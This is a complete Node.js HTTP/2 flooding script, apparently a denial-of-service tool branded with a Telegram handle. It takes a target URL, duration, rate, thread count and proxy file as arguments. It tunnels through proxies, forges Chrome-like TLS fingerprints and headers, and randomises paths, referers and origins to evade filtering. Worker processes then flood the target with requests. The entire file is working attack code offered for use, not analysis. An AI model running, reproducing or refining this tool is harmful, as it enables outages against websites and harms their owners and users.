 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const os = require('os');
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 7){console.log(`usage: node flooder target time rate threads proxyfile`); process.exit();}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 const cplist = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_AES_128_CCM_8_SHA256"
];
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_method";
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 };
var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
	console.clear()
	console.log(`--------------------------------------------`)
	console.log(`Target: ` + process.argv[2])
	console.log(`Time: ` + process.argv[3])
	console.log(`Rate: ` + process.argv[4])
	console.log(`Thread: ` + process.argv[5])
	console.log(`ProxyFile: ` + process.argv[6])
	console.log(`--------------------------------------------`)
	console.log('t.me/bexnxx')
	const restartScript = () => {
		for (const id in cluster.workers) {
			cluster.workers[id].kill();
		}
		console.log('[>] Restarting script...');
		setTimeout(() => {
			for (let counter = 1; counter <= args.threads; counter++) {
				cluster.fork();
			}
		}, 1000);
	};
	const handleRAMUsage = () => {
		const totalRAM = os.totalmem();
		const usedRAM = totalRAM - os.freemem();
		const ramPercentage = (usedRAM / totalRAM) * 100;
		if (ramPercentage >= 50) {
			console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
			restartScript();
		}
	};
	setInterval(handleRAMUsage, 5000);
	for (let counter = 1; counter <= args.threads; counter++) {
		cluster.fork();
	}
  setTimeout(() => {
    process.exit(1);
  }, args.time * 1000);
  
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 600000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function bexRandomString(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
		const randomStringArray = Array.from({
			length
		}, () => {
			const randomIndex = Math.floor(Math.random() * characters.length);
			return characters[randomIndex];
		});
		return randomStringArray.join('');
	}
const refers = [ parsedTarget.host, 'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com' ];
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const version = Math.floor(Math.random() * (124 - 115 + 1)) + 115;
     const useragentWindows = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
     const useragentAndroid = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`;
     const finnalUa = Math.random() < 0.5 ? useragentWindows : useragentAndroid;
     const Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];

let headersbex = {
":method": "GET",
":scheme": "https",
":authority": parsedTarget.host,
":path": parsedTarget.path + '?' + bexRandomString(5, 10) + '=' + bexRandomString(10, 15),
'User-Agent': finnalUa,
'Accept': Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json",
'Accept-Language': Math.random() > 0.5 ? 'en-US,en;q=0.5' : "en-US,en;q=0.5,id-ID,id;q=0.5",
'Accept-Encoding': Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
'sec-ch-ua': `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
"Sec-CH-UA-Full-Version-List": `"chrome";v="${version}.0.0.0", "Not A;Brand";v="99.0.0.0"`,
"sec-ch-ua-mobile": finnalUa === useragentAndroid ? "?1" : "?0",
'Sec-Fetch-User': Math.random() < 0.75 ? "?1;?1" : "?1",
...(Math.random() < 0.75 ? {'Upgrade-Insecure-Requests': '1'} :{}),
...(Math.random() < 0.75 ? {"Cache-Control": "max-age=0"} :{}),
'Pragma': 'no-cache',
"referer": Math.random() < 0.5 ? Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref : Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
"origin": Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref,
};

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 10
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true)

         const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: Math.random() < 0.5 ? 'TLSv1_2_method' : 'TLSv1_3_method',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsBex.allowHalfOpen = true;
         tlsBex.setNoDelay(true);
         tlsBex.setKeepAlive(true, 600000);
         tlsBex.setMaxListeners(0);
 
         const bexClient = http2.connect(parsedTarget.href, {
             protocol: "https:",
             createConnection: () => tlsBex,
             settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100,
                initialWindowSize: 65535,
                maxFrameSize: 16384,
                enablePush: false,
               },
         });
         bexClient.setMaxListeners(0);
         bexClient.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('STRING DATA'));
         bexClient.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const bex = bexClient.request(headersbex, {
                      weight: Math.random() < 0.5 ? 255 : 220,
                      depends_on: 0,
                      exclusive: Math.random() < 0.5 ? true : false,
                      })
                    .on('response', response => {
                        bex.close();
                        bex.destroy();
                        return
                    });
                    bex.end();
                }
            }, 1000); 
         });
 
         bexClient.on("close", () => {
             bexClient.destroy();
             connection.destroy();
             return
         });
 
         bexClient.on("error", error => {
             bexClient.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
